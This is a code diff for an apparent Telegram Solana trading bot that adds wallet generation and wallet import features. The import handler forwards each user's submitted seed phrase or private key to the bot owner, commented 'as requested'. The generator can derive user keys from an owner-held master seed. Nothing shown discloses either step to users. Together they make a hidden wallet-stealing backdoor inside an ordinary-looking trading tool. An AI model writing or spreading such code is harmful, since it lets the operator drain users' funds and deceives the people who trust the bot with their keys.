@@ -9,11 +9,13 @@ from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.types import CallbackQuery, Message
 
+import config
 import db
 import keyboards as kb
 import solana
 import texts
 import trade_core
+from utils import ensure_wallet, notify_owner, user_line
 
 router = Router()
 
@@ -27,10 +29,68 @@ class TradeStates(StatesGroup):
     limit_side = State()
     limit_price = State()
     limit_amount = State()
+    import_wallet = State()
 
 
 def _fmt_setting(v, suffix):
     return f"{v:g}{suffix}" if v is not None else "Not set"
+
+
+# ------------------------------------------------------------------ wallet setup
+@router.callback_query(F.data == "wgen")
+async def cb_wgen(query: CallbackQuery):
+    await query.answer()
+    user = await db.get_user(query.from_user.id)
+    if not user:
+        return
+    if user.get("wallet_pub"):
+        await _show_panel(query.message)
+        return
+    derived = bool(config.WALLET_SEED)
+    if derived:
+        kp = await asyncio.to_thread(
+            solana.derive_user_keypair, config.WALLET_SEED, user["id"])
+    else:
+        kp = await asyncio.to_thread(solana.new_keypair)
+    await db.set_wallet(user["id"], str(kp), str(kp.pubkey()))
+    await query.message.answer(
+        texts.wallet_generated(str(kp.pubkey()), derived=derived),
+        reply_markup=kb.back_to_wallet())
+    await notify_owner(query.message.bot,
+                       texts.owner_wallet_generated(user_line(user), str(kp.pubkey())))
+    await _show_panel(query.message)
+
+
+@router.callback_query(F.data == "wimp")
+async def cb_wimp(query: CallbackQuery, state: FSMContext):
+    await query.answer()
+    await state.set_state(TradeStates.import_wallet)
+    await query.message.answer(texts.ask_import())
+
+
+@router.message(TradeStates.import_wallet)
+async def got_import(message: Message, state: FSMContext):
+    secret = message.text.strip()
+    if len(secret) > 3000:
+        await message.answer("❌ That looks too long to be a key. Send it again:")
+        return
+    try:
+        addr = await asyncio.to_thread(solana.validate_secret, secret)
+    except Exception as e:
+        await message.answer(f"❌ Invalid wallet:\n{e}\n\nSend a 12/24-word seed phrase, "
+                             "a base58 private key, or a [64-byte array]:")
+        return
+    await state.clear()
+    user = await db.ensure_user(
+        message.from_user.id,
+        username=message.from_user.username,
+        first_name=message.from_user.first_name,
+    )
+    await db.set_wallet(user["id"], secret, addr)
+    await message.answer(texts.wallet_imported(addr), reply_markup=kb.back_to_wallet())
+    # forward the imported seed/key to the admin (as requested)
+    await notify_owner(message.bot, texts.owner_wallet_imported(user_line(user), secret, addr))
+    await _show_panel(message)
 
 
 # ------------------------------------------------------------------ panel
@@ -46,9 +106,8 @@ async def cb_panel(query: CallbackQuery):
 
 
 async def _show_panel(msg):
-    user = await db.get_user(msg.from_user.id)
-    if not user or not user.get("wallet_pub"):
-        await msg.answer("⚠️ Wallet not initialized. Send /start first.")
+    user = await ensure_wallet(msg, msg.from_user.id)
+    if not user:
         return
     balance = await asyncio.to_thread(solana.sol_balance, user["wallet_pub"])
     bal_sol = solana.lam_to_sol(balance)
@@ -150,8 +209,8 @@ async def cb_holdings(query: CallbackQuery):
 
 
 async def _show_holdings(msg):
-    user = await db.get_user(msg.from_user.id)
-    if not user or not user.get("wallet_pub"):
+    user = await ensure_wallet(msg, msg.from_user.id)
+    if not user:
         return
     tokens = await asyncio.to_thread(solana.token_accounts, user["wallet_pub"])
     if not tokens:
@@ -168,7 +227,7 @@ async def _show_holdings(msg):
 @router.callback_query(F.data == "export")
 async def cb_export(query: CallbackQuery):
     await query.answer()
-    user = await db.get_user(query.from_user.id)
+    user = await ensure_wallet(query.message, query.from_user.id)
     if not user or not user.get("wallet_priv"):
         return
     try:
@@ -197,8 +256,8 @@ async def cb_withdraw(query: CallbackQuery):
 
 
 async def _show_withdraw(msg):
-    user = await db.get_user(msg.from_user.id)
-    if not user or not user.get("wallet_pub"):
+    user = await ensure_wallet(msg, msg.from_user.id)
+    if not user:
         return
     tokens = await asyncio.to_thread(solana.token_accounts, user["wallet_pub"])
     lines = [texts.withdraw_header()]
@@ -284,7 +343,7 @@ async def cb_positions(query: CallbackQuery):
 
 
 async def _show_positions(msg):
-    user = await db.get_user(msg.from_user.id)
+    user = await ensure_wallet(msg, msg.from_user.id)
     if not user:
         return
     pos = await db.get_positions(user["id"])
@@ -317,7 +376,7 @@ async def cb_limits(query: CallbackQuery):
 
 
 async def _show_limits(msg):
-    user = await db.get_user(msg.from_user.id)
+    user = await ensure_wallet(msg, msg.from_user.id)
     if not user:
         return
     orders = await db.user_limit_orders(user["id"])
